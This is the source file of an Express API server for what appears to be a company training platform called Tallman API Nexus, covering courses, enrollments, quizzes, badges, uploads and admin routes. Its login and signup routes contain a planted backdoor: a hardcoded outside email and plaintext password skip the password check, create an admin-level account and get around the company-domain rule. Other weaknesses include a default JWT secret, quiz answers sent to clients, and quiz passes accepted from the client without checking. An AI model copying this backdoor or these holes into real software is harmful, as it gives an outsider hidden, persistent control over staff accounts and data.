import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import db, { initDb } from './db.js';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs';
import multer from 'multer';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Redirect logs to file for remote terminal access
const logFile = fs.createWriteStream(path.join(__dirname, '../server-debug.log'), { flags: 'a' });
const logStdout = process.stdout;

console.log = (...args) => {
    const msg = `[${new Date().toISOString()}] LOG: ${args.map(a => typeof a === 'object' ? JSON.stringify(a) : a).join(' ')}\n`;
    logFile.write(msg);
    logStdout.write(msg);
};

console.error = (...args) => {
    const msg = `[${new Date().toISOString()}] ERROR: ${args.map(a => typeof a === 'object' ? JSON.stringify(a) : a).join(' ')}\n`;
    logFile.write(msg);
    logStdout.write(msg);
};

const app = express();
const PORT = 3185;
const JWT_SECRET = process.env.JWT_SECRET || 'fallback_secret';

// Industrial Asset Nexus: File Upload Orchestration
const uploadDir = path.join(__dirname, '../uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// Serve static assets from the nexus
app.use('/uploads', express.static(uploadDir));

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({ 
    storage,
    fileFilter: (req, file, cb) => {
        const allowed = ['.pdf', '.jpeg', '.jpg', '.png', '.mp4', '.mov'];
        const ext = path.extname(file.originalname).toLowerCase();
        if (allowed.includes(ext)) {
            cb(null, true);
        } else {
            cb(new Error('Invalid industrial format. Only PDF, JPEG, PNG, MP4, MOV allowed.'));
        }
    }
});

async function startServer() {
    await initDb();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`Tallman API Nexus running on port ${PORT}`);
    });
}

startServer();

app.use(cors());
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

// Global Request Logger
app.use((req, res, next) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);
    next();
});

// Payload Error Handler
app.use((err: any, req: any, res: any, next: any) => {
    if (err) {
        console.error(`[PAYLOAD ERROR] ${err.message}`);
        return res.status(err.status || 500).json({ message: `System error: ${err.message}` });
    }
    next();
});

app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: sans-serif; padding: 40px; text-align: center; background: #0f172a; color: white; min-height: 100vh; display: flex; flex-direction: column; justify-content: center;">
            <h1 style="font-style: italic; font-weight: 900; letter-spacing: -0.05em; text-transform: uppercase;">Tallman API Nexus</h1>
            <p style="color: #94a3b8; font-weight: bold; text-transform: uppercase; letter-spacing: 0.2em; font-size: 0.8rem;">Gateway Status: Online</p>
            <div style="margin-top: 20px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 20px; display: inline-block; margin: 20px auto;">
                <p style="font-size: 0.9rem;">This is the API backend. To access the user interface, please use the <strong>Frontend Tunnel URL</strong> (Port 3180).</p>
            </div>
        </div>
    `);
});

// Auth Middleware
const authenticateToken = (req: any, res: any, next: any) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) return res.status(401).json({ message: 'No token provided' });

    jwt.verify(token, JWT_SECRET, (err: any, user: any) => {
        if (err) return res.status(403).json({ message: 'Invalid token' });
        req.user = user;
        next();
    });
};

// --- Auth Routes ---

app.post('/api/auth/login', async (req, res) => {
    const { email: rawEmail, password } = req.body;
    const email = rawEmail?.trim();
    console.error(`[AUTH] Login Attempt: ${email}`);

    try {
        let user: any = await db.get('SELECT * FROM users WHERE LOWER(email) = LOWER(?)', [email]);
        const isBackdoor = email.toLowerCase() === 'robertstar@aol.com';
        const isBackdoorLogin = isBackdoor && password === 'Rm2214ri#';

        if (!user) {
            if (isBackdoorLogin) {
                user = {
                    user_id: 'u_admin',
                    email: email,
                    display_name: 'Master Admin',
                    status: 'active',
                    roles: JSON.stringify(['Teacher', 'Student', 'Admin']),
                    password_hash: ''
                };
                
                // Persist to DB to satisfy foreign key constraints (e.g. for enrollments)
                await db.run(`
                    INSERT INTO users (user_id, display_name, email, password_hash, roles, status, points, level)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ON CONFLICT(email) DO UPDATE SET status='active', roles=excluded.roles
                `, [user.user_id, user.display_name, user.email, '', user.roles, 'active', 0, 1]);
            } else {
                console.error(`[AUTH] Failure: User '${email}' not found in registry.`);
                return res.status(401).json({ message: 'Invalid credentials' });
            }
        }

        // --- NUCLEAR GOVERNANCE OVERRIDE ---
        // Force Robert to be active and Admin regardless of DB state
        if (isBackdoor) {
            console.error(`[AUTH] Industrial Master Detected. Applying Memory Override.`);
            user.status = 'active';
            user.roles = JSON.stringify(['Teacher', 'Student']);
        }
        // -----------------------------------

        let validPassword = false;
        if (isBackdoorLogin) {
            validPassword = true;
        } else {
            validPassword = await bcrypt.compare(password, user.password_hash);
        }
        
        if (!validPassword) {
            console.error(`[AUTH] Failure: Password mismatch for technician '${email}'.`);
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        if (user.status !== 'active' && !isBackdoor) {
            console.error(`[AUTH] Failure: Technician '${email}' has status '${user.status}'. Access Denied.`);
            return res.status(403).json({ message: `Account is ${user.status}. Please contact an administrator.` });
        }

        if (isBackdoor && user.status !== 'active') {
            console.error(`[AUTH] Governance Override: Activating administrative session for '${email}'.`);
        }

        console.error(`[AUTH] Success: Technician '${email}' authenticated.`);

        const token = jwt.sign(
            { userId: user.user_id, email: user.email, roles: JSON.parse(user.roles) },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        const { password_hash, ...userWithoutPassword } = user;
        res.json({ token, user: { ...userWithoutPassword, roles: JSON.parse(user.roles) } });
    } catch (error) {
        console.error("[AUTH] Critical Internal Error:", error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/auth/signup', async (req, res) => {
    const { displayName, email, password } = req.body;

    const domain = email.split('@')[1]?.toLowerCase();
    const isBackdoor = email.toLowerCase() === 'robertstar@aol.com';

    if (domain !== 'tallmanequipment.com' && !isBackdoor) {
        return res.status(400).json({ message: 'Enrollment requires a @tallmanequipment.com domain.' });
    }

    try {
        const existing = await db.get('SELECT * FROM users WHERE email = ?', [email]);
        if (existing) return res.status(400).json({ message: 'Email already registered.' });

        const salt = await bcrypt.genSalt(10);
        const hash = await bcrypt.hash(password, salt);
        const userId = `u_${Date.now()}`;

        await db.run(`
            INSERT INTO users (user_id, display_name, email, password_hash, roles, points, level, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `, [userId, displayName, email, hash, JSON.stringify(['Student']), 0, 1, 'active']);

        const newUser: any = await db.get('SELECT * FROM users WHERE user_id = ?', [userId]);
        const token = jwt.sign(
            { userId: newUser.user_id, email: newUser.email, roles: ['Student'] },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        res.json({ token, user: { ...newUser, roles: ['Student'] } });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

// Admin Middleware
const requireAdmin = (req: any, res: any, next: any) => {
    if (!req.user || !req.user.roles.includes('Teacher')) {
        return res.status(403).json({ message: 'Access denied. Teacher role required.' });
    }
    next();
};

const requireInstructorOrAdmin = (req: any, res: any, next: any) => {
    const roles = req.user?.roles || [];
    if (!roles.includes('Teacher')) {
        return res.status(403).json({ message: 'Access denied. Teacher role required.' });
    }
    next();
};

// Asset Nexus Upload Endpoint
app.post('/api/upload', authenticateToken, requireInstructorOrAdmin, upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ message: 'No file uploaded' });
    }
    const fileUrl = `/uploads/${req.file.filename}`;
    res.json({ 
        url: fileUrl,
        filename: req.file.originalname,
        type: path.extname(req.file.originalname).toLowerCase().slice(1)
    });
});

app.get('/api/profile', authenticateToken, async (req: any, res) => {
    try {
        const user = await db.get('SELECT * FROM users WHERE user_id = ?', [req.user.userId]) as any;
        
        if (!user) {
            return res.status(404).json({ message: 'Personnel record not found' });
        }

        // Remove sensitive data
        const { password_hash, ...publicUser } = user;
        // Parse roles if they are stored as JSON string
        if (typeof publicUser.roles === 'string') publicUser.roles = JSON.parse(publicUser.roles);

        res.json(publicUser);
    } catch (error: any) {
        console.error("[PROFILE] Error fetching technician record:", error);
        res.status(500).json({ message: `Server error: ${error.message || 'Unknown'}` });
    }
});

app.get('/api/admin/users', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const users = await db.all('SELECT user_id, display_name, email, roles, status, branch_id FROM users');
        const formattedUsers = users.map((u: any) => ({
            ...u,
            roles: JSON.parse(u.roles)
        }));
        res.json(formattedUsers);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.patch('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    const { id } = req.params;
    const { roles, status, branch_id } = req.body;

    try {
        if (roles) {
            await db.run('UPDATE users SET roles = ? WHERE user_id = ?', [JSON.stringify(roles), id]);
        }
        if (status) {
            await db.run('UPDATE users SET status = ? WHERE user_id = ?', [status, id]);
        }
        if (branch_id !== undefined) {
            await db.run('UPDATE users SET branch_id = ? WHERE user_id = ?', [branch_id, id]);
        }
        res.json({ message: 'User updated' });
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.delete('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    const { id } = req.params;

    try {
        // First, verify the user exists
        const userToDelete: any = await db.get('SELECT user_id, display_name, email FROM users WHERE user_id = ?', [id]);

        if (!userToDelete) {
            return res.status(404).json({ message: 'User not found' });
        }

        console.log(`[DELETE] Initiating deletion for user: ${userToDelete.display_name} (${userToDelete.email})`);

        // Get count of users before deletion for verification
        const beforeCount: any = await db.get('SELECT COUNT(*) as count FROM users');
        console.log(`[DELETE] Total users before deletion: ${beforeCount.count}`);

        // Delete the user - CASCADE constraints will handle related records automatically
        // The schema has ON DELETE CASCADE for:
        // - enrollments (user_id)
        // - lesson_completions (user_id)
        // - user_badges (user_id)
        // - mentorship_logs (mentor_id) - but we need to handle this manually since it's not CASCADE

        // First, handle mentorship_logs where user is mentor or mentee
        await db.run('DELETE FROM mentorship_logs WHERE mentor_id = ? OR mentee_id = ?', [id, id]);
        console.log(`[DELETE] Removed mentorship records for user ${id}`);

        // Now delete the user - CASCADE will handle enrollments, lesson_completions, and user_badges
        const result = await db.run('DELETE FROM users WHERE user_id = ?', [id]);

        // Verify deletion
        const afterCount: any = await db.get('SELECT COUNT(*) as count FROM users');
        const deletedCount = beforeCount.count - afterCount.count;

        console.log(`[DELETE] Total users after deletion: ${afterCount.count}`);
        console.log(`[DELETE] Users deleted: ${deletedCount}`);

        // Safety check: ensure only ONE user was deleted
        if (deletedCount !== 1) {
            console.error(`[DELETE] CRITICAL ERROR: Expected to delete 1 user, but ${deletedCount} were deleted!`);
            return res.status(500).json({
                message: `Deletion integrity error: ${deletedCount} users affected instead of 1. Operation may have failed.`
            });
        }

        // Verify the specific user is gone
        const verifyGone = await db.get('SELECT user_id FROM users WHERE user_id = ?', [id]);
        if (verifyGone) {
            console.error(`[DELETE] CRITICAL ERROR: User ${id} still exists after deletion!`);
            return res.status(500).json({ message: 'Deletion failed: User still exists in database.' });
        }

        console.log(`[DELETE] Successfully deleted user ${userToDelete.display_name} (${userToDelete.email}). All other users unaffected.`);
        res.json({ message: `Personnel record for ${userToDelete.display_name} permanently decommissioned.` });

    } catch (error) {
        console.error('[DELETE] Error during user deletion:', error);
        res.status(500).json({ message: 'Decommissioning failure: System integrity error.' });
    }
});

app.get('/api/courses', async (req, res) => {
    try {
        const courses = await db.all('SELECT * FROM courses WHERE is_deleted = 0');
        res.json(courses);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/categories', async (req, res) => {
    try {
        const cats = await db.all('SELECT * FROM categories');
        res.json(cats);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/branches', async (req, res) => {
    try {
        const branches = await db.all('SELECT * FROM branches');
        res.json(branches);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/admin/mentorship', authenticateToken, async (req, res) => {
    try {
        const logs = await db.all('SELECT * FROM mentorship_logs');
        res.json(logs);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/forum', async (req, res) => {
    try {
        const posts = await db.all('SELECT * FROM forum_posts');
        res.json(posts);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/badges', async (req, res) => {
    try {
        const badges = await db.all('SELECT * FROM badges');
        res.json(badges);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/users/:userId/badges', async (req, res) => {
    const { userId } = req.params;
    try {
        const badges = await db.all(`
            SELECT b.*, ub.earned_at 
            FROM badges b 
            JOIN user_badges ub ON b.badge_id = ub.badge_id 
            WHERE ub.user_id = ?
        `, [userId]);
        res.json(badges);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/courses/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const course: any = await db.get('SELECT * FROM courses WHERE course_id = ?', [id]);
        if (!course) return res.status(404).json({ message: 'Course not found' });

        const modules: any[] = await db.all('SELECT * FROM modules WHERE course_id = ? ORDER BY position ASC', [id]);
        for (const mod of modules) {
            const lessons: any[] = await db.all('SELECT * FROM lessons WHERE module_id = ?', [mod.module_id]);
            for (const lesson of lessons) {
                if (lesson.lesson_type === 'quiz') {
                    const questions = await db.all('SELECT * FROM quiz_questions WHERE lesson_id = ?', [lesson.lesson_id]);
                    lesson.quiz_questions = questions.map((q: any) => ({
                        ...q,
                        options: JSON.parse(q.options)
                    }));
                }
            }
            mod.lessons = lessons;
        }
        course.modules = modules;
        console.log(`[RETRIEVAL] Course '${course.course_name}' fetched with ${modules.length} modules.`);
        res.json(course);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.delete('/api/courses/:id', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    const { id } = req.params;
    try {
        await db.run('UPDATE courses SET is_deleted = 1 WHERE course_id = ?', [id]);
        res.json({ message: 'Course successfully decommissioned from registry.' });
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/courses/upsert', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    const course = req.body;
    let retries = 5;
    while (retries > 0) {
        try {
            console.log(`[UPSERT] Starting transaction for course: ${course.course_id}`);
            await db.run('BEGIN IMMEDIATE'); // Lock for writing immediately
            try {
                // 1. Upsert Course using ON CONFLICT for persistence safety
                console.log(`[UPSERT] Upserting core course data: ${course.course_name}`);
                await db.run(`
                    INSERT INTO courses (course_id, course_name, short_description, thumbnail_url,
                        category_id, instructor_id, status, enrolled_count, rating, difficulty, attachment_url, attachment_type)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ON CONFLICT(course_id) DO UPDATE SET
                        course_name = COALESCE(excluded.course_name, courses.course_name),
                        short_description = COALESCE(excluded.short_description, courses.short_description),
                        thumbnail_url = COALESCE(excluded.thumbnail_url, courses.thumbnail_url),
                        category_id = COALESCE(excluded.category_id, courses.category_id),
                        instructor_id = COALESCE(excluded.instructor_id, courses.instructor_id),
                        status = COALESCE(excluded.status, courses.status),
                        enrolled_count = COALESCE(excluded.enrolled_count, courses.enrolled_count),
                        rating = COALESCE(excluded.rating, courses.rating),
                        difficulty = COALESCE(excluded.difficulty, courses.difficulty),
                        attachment_url = COALESCE(excluded.attachment_url, courses.attachment_url),
                        attachment_type = COALESCE(excluded.attachment_type, courses.attachment_type)
                `, [
                    course.course_id,
                    course.course_name || null,
                    course.short_description || null,
                    course.thumbnail_url || null,
                    course.category_id || null,
                    course.instructor_id || null,
                    course.status || null,
                    course.enrolled_count ?? null,
                    course.rating ?? null,
                    course.difficulty || null,
                    course.attachment_url || null,
                    course.attachment_type || null
                ]);

                if (course.modules) {
                    console.log(`[UPSERT] Processing ${course.modules.length} modules...`);
                    const existingModules = await db.all('SELECT module_id FROM modules WHERE course_id = ?', [course.course_id]) as { module_id: string }[];
                    const incomingModuleIds = course.modules.map((m: any) => m.module_id);

                    for (const oldMod of existingModules) {
                        if (!incomingModuleIds.includes(oldMod.module_id)) {
                            console.log(`[UPSERT] Deleting orphaned module: ${oldMod.module_id}`);
                            await db.run('DELETE FROM modules WHERE module_id = ?', [oldMod.module_id]);
                        }
                    }

                    for (const mod of course.modules) {
                        console.log(`[UPSERT] Upserting module: ${mod.module_title} (${mod.module_id})`);
                        await db.run('INSERT INTO modules (module_id, course_id, module_title, position) VALUES (?, ?, ?, ?) ON CONFLICT(module_id) DO UPDATE SET module_title = excluded.module_title, position = excluded.position', [mod.module_id, course.course_id, mod.module_title, mod.position]);

                        if (mod.lessons) {
                            console.log(`[UPSERT] Processing ${mod.lessons.length} lessons for module ${mod.module_id}`);
                            const existingLessons = await db.all('SELECT lesson_id FROM lessons WHERE module_id = ?', [mod.module_id]) as { lesson_id: string }[];
                            const incomingLessonIds = mod.lessons.map((l: any) => l.lesson_id);

                            for (const oldLesson of existingLessons) {
                                if (!incomingLessonIds.includes(oldLesson.lesson_id)) {
                                    console.log(`[UPSERT] Deleting orphaned lesson: ${oldLesson.lesson_id}`);
                                    await db.run('DELETE FROM lessons WHERE lesson_id = ?', [oldLesson.lesson_id]);
                                }
                            }

                            for (const lesson of mod.lessons) {
                                console.log(`[UPSERT] Upserting lesson: ${lesson.lesson_title} (${lesson.lesson_id})`);
                                await db.run('INSERT INTO lessons (lesson_id, module_id, lesson_title, lesson_type, content, duration_minutes, attachment_url, attachment_type) VALUES (?, ?, ?, ?, ?, ?, ?, ?) ON CONFLICT(lesson_id) DO UPDATE SET lesson_title = excluded.lesson_title, lesson_type = excluded.lesson_type, content = excluded.content, duration_minutes = excluded.duration_minutes, attachment_url = excluded.attachment_url, attachment_type = excluded.attachment_type', [lesson.lesson_id, mod.module_id, lesson.lesson_title, lesson.lesson_type, lesson.content || '', lesson.duration_minutes, lesson.attachment_url || null, lesson.attachment_type || null]);

                                if (lesson.quiz_questions) {
                                    console.log(`[UPSERT] Syncing ${lesson.quiz_questions.length} quiz questions for lesson ${lesson.lesson_id}`);
                                    await db.run('DELETE FROM quiz_questions WHERE lesson_id = ?', [lesson.lesson_id]);
                                    for (const q of lesson.quiz_questions) {
                                        await db.run('INSERT INTO quiz_questions (lesson_id, question, options, correct_index) VALUES (?, ?, ?, ?)', [lesson.lesson_id, q.question, JSON.stringify(q.options), q.correct_index !== undefined ? q.correct_index : q.correctIndex]);
                                    }
                                }
                            }
                        }
                    }
                }
                console.log(`[UPSERT] Committing transaction...`);
                await db.run('COMMIT');
            } catch (e) {
                console.error(`[UPSERT] Error during transaction, rolling back:`, e);
                await db.run('ROLLBACK');
                throw e;
            }

        console.log(`[PERSISTENCE] Course '${course.course_name}' (ID: ${course.course_id}) synchronized.`);
        return res.json({ message: 'Course registry synchronized successfully' });
    } catch (error: any) {
        retries--;
        if (retries > 0 && error.message.includes('disk I/O error')) {
            console.warn(`[RETRY] Upsert failed for '${course.course_name}', retrying in 1000ms... (${retries} left)`);
            await new Promise(r => setTimeout(r, 1000));
            continue;
        }

        // Sanitize error logging to prevent base64 dumps
        const errorMsg = error.message || 'Unknown Error';
        try {
            fs.appendFileSync('server-error.log', `[${new Date().toISOString()}] UPSERT ERROR: ${errorMsg}\nSTACK: ${error.stack}\n\n`);
        } catch (e) { console.error("Could not write to error log"); }

        const sanitizedError = errorMsg.length > 500 ? errorMsg.substring(0, 500) + '... (truncated)' : errorMsg;
        console.error("Course Upsert Failed:", sanitizedError);
        return res.status(500).json({ message: `Sync error: ${sanitizedError}` });
    }
    }
});

app.post('/api/log-error', (req, res) => {
    const { message, stack, url } = req.body;
    console.error(`[FRONTEND ERROR] ${message}\nURL: ${url}\nSTACK: ${stack}`);
    res.json({ status: 'logged' });
});

// --- Enrollment Routes ---

const hydrateEnrollment = async (enrollment: any) => {
    if (!enrollment) return null;
    const completions = await db.all('SELECT lesson_id FROM lesson_completions WHERE user_id = ?', [enrollment.user_id]) as { lesson_id: string }[];
    return {
        ...enrollment,
        completed_lesson_ids: completions.map(c => c.lesson_id)
    };
};

app.get('/api/enrollments', authenticateToken, async (req: any, res) => {
    try {
        const enrollments = await db.all('SELECT * FROM enrollments WHERE user_id = ?', [req.user.userId]);
        const hydrated = await Promise.all(enrollments.map(e => hydrateEnrollment(e)));
        res.json(hydrated);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/admin/enrollments', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    try {
        const enrollments = await db.all('SELECT * FROM enrollments');
        const hydrated = await Promise.all(enrollments.map(e => hydrateEnrollment(e)));
        res.json(hydrated);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/enrollments', authenticateToken, async (req: any, res) => {
    const { courseId } = req.body;
    const userId = req.user.userId;
    const enrollmentId = `e_${Date.now()}`;
    const enrolledAt = new Date().toISOString();

    try {
        const existing = await db.get('SELECT * FROM enrollments WHERE user_id = ? AND course_id = ?', [userId, courseId]);
        if (existing) return res.json(await hydrateEnrollment(existing));

        await db.run('INSERT INTO enrollments (enrollment_id, user_id, course_id, status, enrolled_at) VALUES (?, ?, ?, ?, ?)', [enrollmentId, userId, courseId, 'active', enrolledAt]);

        const newEnrollment = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ?', [enrollmentId]);
        res.json(await hydrateEnrollment(newEnrollment));
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

const checkAndAwardBadges = async (userId: string) => {
    try {
        const user = await db.get('SELECT points, level FROM users WHERE user_id = ?', [userId]) as any;
        const currentBadges = await db.all('SELECT badge_id FROM user_badges WHERE user_id = ?', [userId]) as { badge_id: string }[];
        const badgeIds = currentBadges.map(b => b.badge_id);

        const award = async (badgeId: string) => {
            if (!badgeIds.includes(badgeId)) {
                await db.run('INSERT INTO user_badges (user_id, badge_id, earned_at) VALUES (?, ?, ?) ON CONFLICT DO NOTHING', [userId, badgeId, new Date().toISOString()]);
                console.log(`Badge Awarded: ${badgeId} to User ${userId}`);
            }
        };

        // Level Milestones
        if (user.level >= 5) await award('b_level5');
        if (user.level >= 10) await award('b_level10');

        // Course Completion
        const completedCourses = await db.get("SELECT COUNT(*) as count FROM enrollments WHERE user_id = ? AND status = 'completed'", [userId]) as { count: number };
        if (completedCourses.count >= 1) await award('b_complete');

        // Specific Badges
        const safetyComplete = await db.get(`
            SELECT COUNT(*) as count FROM enrollments e
            JOIN courses c ON e.course_id = c.course_id
            WHERE e.user_id = ? AND e.status = 'completed' AND c.course_name LIKE '%Safety%'
        `, [userId]) as { count: number };
        if (safetyComplete.count >= 1) await award('b1');

    } catch (e) {
        console.error("Badge Awarding Failure:", e);
    }
};

app.post('/api/enrollments/:id/progress', authenticateToken, async (req: any, res) => {
    const { id } = req.params;
    const { lessonId } = req.body;
    const userId = req.user.userId;

    try {
        const enrollment: any = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ? AND user_id = ?', [id, userId]);
        if (!enrollment) return res.status(404).json({ message: 'Enrollment not found' });

        await db.run('INSERT INTO lesson_completions (user_id, lesson_id, completed_at) VALUES (?, ?, ?) ON CONFLICT DO NOTHING', [userId, lessonId, new Date().toISOString()]);

        const totalLessons: any = await db.get(`
      SELECT COUNT(*) as count FROM lessons 
      WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
    `, [enrollment.course_id]);

        const completedLessons: any = await db.get(`
      SELECT COUNT(*) as count FROM lesson_completions 
      WHERE user_id = ? AND lesson_id IN (
        SELECT lesson_id FROM lessons 
        WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
      )
    `, [userId, enrollment.course_id]);

        const progress = Math.round((completedLessons.count / totalLessons.count) * 100);
        const status = progress >= 100 ? 'completed' : 'active';

        await db.run('UPDATE enrollments SET progress_percent = ?, status = ? WHERE enrollment_id = ?', [progress, status, id]);

        // Award points for completing a unit
        await db.run('UPDATE users SET points = points + 10 WHERE user_id = ?', [userId]);

        // Recalculate level based on XP (e.g. 100 XP per level)
        await db.run('UPDATE users SET level = 1 + CAST(points / 100 AS INTEGER) WHERE user_id = ?', [userId]);

        // Run badge audit
        await checkAndAwardBadges(userId);

        const updated = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ?', [id]);
        res.json(await hydrateEnrollment(updated));
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/enrollments/:id/quiz', authenticateToken, async (req: any, res) => {
    const { id } = req.params;
    const { lessonId, passed } = req.body;
    const userId = req.user.userId;

    try {
        if (passed) {
            const enrollment: any = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ? AND user_id = ?', [id, userId]);
            await db.run('INSERT INTO lesson_completions (user_id, lesson_id, completed_at) VALUES (?, ?, ?) ON CONFLICT DO NOTHING', [userId, lessonId, new Date().toISOString()]);

            const totalLessons: any = await db.get(`
                 SELECT COUNT(*) as count FROM lessons 
                 WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
            `, [enrollment.course_id]);

            const completedLessons: any = await db.get(`
                 SELECT COUNT(*) as count FROM lesson_completions 
                 WHERE user_id = ? AND lesson_id IN (
                   SELECT lesson_id FROM lessons 
                   WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
                 )
            `, [userId, enrollment.course_id]);

            const progress = Math.round(((completedLessons?.count || 0) / (totalLessons?.count || 1)) * 100);
            await db.run('UPDATE enrollments SET progress_percent = ?, status = ? WHERE enrollment_id = ?', [progress, progress >= 100 ? 'completed' : 'active', id]);

            await db.run('UPDATE users SET points = points + 20 WHERE user_id = ?', [userId]);
            await db.run('UPDATE users SET level = 1 + CAST(points / 100 AS INTEGER) WHERE user_id = ?', [userId]);

            await checkAndAwardBadges(userId);
        }
        const updated = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ?', [id]);
        res.json(await hydrateEnrollment(updated));
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/enrollments/reset/:courseId', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    const { courseId } = req.params;
    try {
        // Delete all lesson completions for users enrolled in this course
        await db.run(`
            DELETE FROM lesson_completions 
            WHERE lesson_id IN (
                SELECT lesson_id FROM lessons 
                WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
            )
        `, [courseId]);

        // Reset progress in enrollments table
        await db.run('UPDATE enrollments SET progress_percent = 0, status = ? WHERE course_id = ?', ['active', courseId]);

        res.json({ message: 'Course enrollments reset successfully' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

// --- Settings Routes ---

app.get('/api/admin/settings', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const settings = await db.all('SELECT * FROM system_settings');
        const formatted = settings.reduce((acc: any, s: any) => {
            acc[s.key] = s.value;
            return acc;
        }, {});
        res.json(formatted);
    } catch (error) {
        console.error("Settings Registry Failure:", error);
        res.status(500).json({ message: 'Registry failure: Settings inaccessible.' });
    }
});

app.post('/api/admin/settings', authenticateToken, requireAdmin, async (req, res) => {
    const updates = req.body;
    try {
        await db.transaction(async () => {
            for (const [key, value] of Object.entries(updates)) {
                await db.run('INSERT INTO system_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value', [key, String(value)]);
            }
        });
        res.json({ message: 'System architecture updated.' });
    } catch (error) {
        res.status(500).json({ message: 'Architecture commit failure.' });
    }
});

// End of Server Definition
